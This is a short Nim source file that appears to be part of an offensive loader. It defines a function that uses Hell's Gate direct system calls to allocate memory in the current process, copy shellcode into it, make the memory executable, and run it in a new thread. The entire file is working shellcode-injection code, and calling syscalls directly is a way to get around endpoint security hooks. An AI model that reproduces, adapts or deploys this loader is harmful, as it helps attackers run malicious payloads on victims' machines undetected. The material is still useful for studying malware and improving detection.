import winim

import utils/hellsgate/[hg, stubs]


proc localShellcodeInjection*(sc: pointer, scLen: int): bool =
  # initialize table
  var t: VX_TABLE
  if not initHG(t):
    return false

  var
    status: NTSTATUS = 0
    lpAddress: LPVOID
    szSc: SIZE_T = scLen
    ulOldProtect: ULONG
    hThread: HANDLE = INVALID_HANDLE_VALUE

  # allocate memory for the shellcode
  HellsGate(t.NtAllocateVirtualMemory.wSystemCall)
  status = HellsDescent(cast[HANDLE](-1), &lpAddress, 0, &szSc, MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE)
  if status != 0:
    return false

  # write memory
  copyMem(lpAddress, sc, scLen)

  # change page permissions
  HellsGate(t.NtProtectVirtualMemory.wSystemCall)
  status = HellsDescent(cast[HANDLE](-1), &lpAddress, &szSc, PAGE_EXECUTE_READ, &ulOldProtect)
  if status != 0:
    return false

  # create thread
  HellsGate(t.NtCreateThreadEx.wSystemCall)
  status = HellsDescent(&hThread, 0x1FFFFF, NULL, -1, lpAddress, NULL, FALSE, NULL, NULL, NULL, NULL)
  if status != 0:
    return false

  # wait for X seconds
  HellsGate(t.NtWaitForSingleObject.wSystemCall)
  status = HellsDescent(hThread, FALSE, NULL)
  if status != 0:
    return false

  return true

